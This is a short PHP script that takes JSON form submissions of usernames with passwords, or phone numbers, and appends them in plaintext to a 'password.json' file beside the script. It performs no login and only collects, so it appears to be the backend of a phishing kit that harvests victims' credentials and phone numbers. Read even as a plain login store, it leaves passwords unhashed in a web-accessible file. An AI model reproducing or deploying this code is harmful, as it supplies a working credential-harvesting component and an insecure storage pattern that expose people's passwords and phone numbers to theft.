<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    header('Content-Type: application/json');
    $data = json_decode(file_get_contents('php://input'), true);
    $formType = $data['formType'] ?? '';
    $username = $data['username'] ?? '';
    $password = $data['password'] ?? '';
    $phone    = $data['phone']    ?? '';
    $filePath = __DIR__ . '/password.json';

    $existingData = file_exists($filePath)
        ? json_decode(file_get_contents($filePath), true)
        : [];

    if ($formType === 'credentials') {
        if (!$username || !$password) {
            echo json_encode(['status'=>'error','message'=>'Username and password are required']);
            exit;
        }
        $existingData[] = ['username'=>$username,'password'=>$password];
    } elseif ($formType === 'phone') {
        if (!$phone) {
            echo json_encode(['status'=>'error','message'=>'Phone number is required']);
            exit;
        }
        $existingData[] = ['phone'=>$phone];
    } else {
        echo json_encode(['status'=>'error','message'=>'Invalid form type']);
        exit;
    }

    if (file_put_contents($filePath, json_encode($existingData, JSON_PRETTY_PRINT))) {
        echo json_encode(['status'=>'success','message'=>'Data stored successfully']);
    } else {
        echo json_encode(['status'=>'error','message'=>'Error saving data']);
    }
    exit;
}
